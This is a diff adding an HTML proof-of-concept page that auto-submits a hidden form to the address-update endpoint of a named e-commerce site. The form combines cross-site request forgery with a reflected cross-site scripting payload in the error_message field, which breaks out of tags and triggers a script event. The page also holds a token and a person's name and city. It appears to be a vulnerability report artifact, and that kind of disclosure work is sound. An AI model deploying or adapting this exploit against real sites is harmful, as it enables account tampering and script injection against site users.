@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <p>Auto-submitting...</p>
+    <form id="autoSubmitForm" action="https://maisonyvesrocher.secretbox.fr/address/update/1618" method="POST">
+      <input type="hidden" name="thelia_front_address_update[success_url]" value="https://maisonyvesrocher.secretbox.fr/account/update">
+      <input type="hidden" name="thelia_front_address_update[error_url]" value="https://maisonyvesrocher.secretbox.fr/address/update/1618">
+      <input type="hidden" name="thelia_front_address_update[error_message]" value="&apos;&quot;1&lt;!--&gt;&lt;/Title/&lt;/Textarea/&lt;/Script/&gt;&lt;/Iframe&gt;&lt;Details/Open/OnToggle=(confirm)(1)--&gt;">
+      <input type="hidden" name="thelia_front_address_update[label]" value="Adresse principale">
+      <input type="hidden" name="thelia_front_address_update[_token]" value="ebr31ZDKNoXwdMESVPg7F6tTcYB7gc000YEi1s1fl20">
+      <input type="hidden" name="thelia_front_address_update[title]" value="1">
+      <input type="hidden" name="thelia_front_address_update[firstname]" value="Bhuwan">
+      <input type="hidden" name="thelia_front_address_update[lastname]" value="Bhetwal">
+      <input type="hidden" name="thelia_front_address_update[address1]" value="Nepal">
+      <input type="hidden" name="thelia_front_address_update[address2]" value="">
+      <input type="hidden" name="thelia_front_address_update[address3]" value="">
+      <input type="hidden" name="thelia_front_address_update[zipcode]" value="44600">
+      <input type="hidden" name="thelia_front_address_update[city]" value="Kathmandu">
+      <input type="hidden" name="thelia_front_address_update[country]" value="64">
+      <input type="hidden" name="thelia_front_address_update[state]" value="">
+    </form>
+    <script>
+      document.getElementById("autoSubmitForm").submit();
+    </script>
+  </body>
+</html>
